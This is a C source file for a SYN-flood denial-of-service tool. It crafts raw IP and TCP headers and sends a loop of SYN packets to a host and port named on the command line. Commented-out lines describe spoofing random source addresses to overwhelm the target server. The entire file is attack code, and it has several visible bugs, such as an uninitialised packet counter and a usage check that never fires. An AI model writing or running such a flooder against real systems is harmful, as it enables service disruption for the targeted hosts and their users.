#include "ip-headers.h"
#include "ip-constructors.c"
#define MAX_PACKETS 100
int main(int argc,char* argv[]){
	srand(time(NULL));
    if(argc==0) fprintf(stdout,"Usage: syn-flood --dest www.host.domain --port port");
	else{
		//char* source_address = "133.37.133.37"; // Generar ips origen aleatorias para forzar al servidor a recibir syn's //
		//char* source_port    = "1337";		      // Con los puertos igual
		char* source_address ="127.0.0.1";
		char* source_port = "1338";
		fprintf(stdout,"%d\n",generate_random_ip_v4());
		char* remote_address = argv[2];
		char* remote_port    = argv[4];		
		int sock = get_socket_descriptor();
		char buffer[PCKT_LEN]; memset(buffer,0,PCKT_LEN);
		struct sockaddr_in myaddr;
		//fprintf(stdout,"filling sockaddr_in ...\n");
		set_sockaddr_in(&myaddr,source_address,source_port);
		//fprintf(stdout,"filled sockaddr_in ! \n");
		IP_HEADER *ip_hdr   = (IP_HEADER *)buffer;
		TCP_HEADER *tcp_hdr = (TCP_HEADER *) (buffer + sizeof(IP_HEADER));
		//fprintf(stdout,"filling IP HEADER ...\n");
		set_ip_header(ip_hdr,source_address,remote_address);
		//fprintf(stdout,"filled IP HEADER ! \nfilling TCP HEADER ...\n");
		set_tcp_header_syn_flood(tcp_hdr,source_port,remote_port,buffer);
		//fprintf(stdout,"filled TCP HEADER ! \nKernel, not fill my header ...\n");
		if(kernel_not_fill_my_header(sock)<0) fprintf(stderr,"Setsockopt not working");
		//fprintf(stdout,"Kernel, not fill my header completed !\nSending test datagram...\n");
		int i,sent;
		char knocked = 0;
		fprintf(stdout,"Sending packets, it could be slow according to size of MAX_PACKETS...\n");
		for(i=0;i<MAX_PACKETS;i++){
			if(sendto(sock, buffer, ip_hdr->total_length, 0, (struct sockaddr *)&myaddr, sizeof(myaddr))>=0) sent++;
			else{ knocked=1; break; }
		}
		fprintf(stdout,"Send process finished, %d packets sent, ",sent);
		if(knocked>0) fprintf(stdout," process knocked\n");
		else fprintf(stdout," process not knocked\n");
	
	}
	return 0;
}
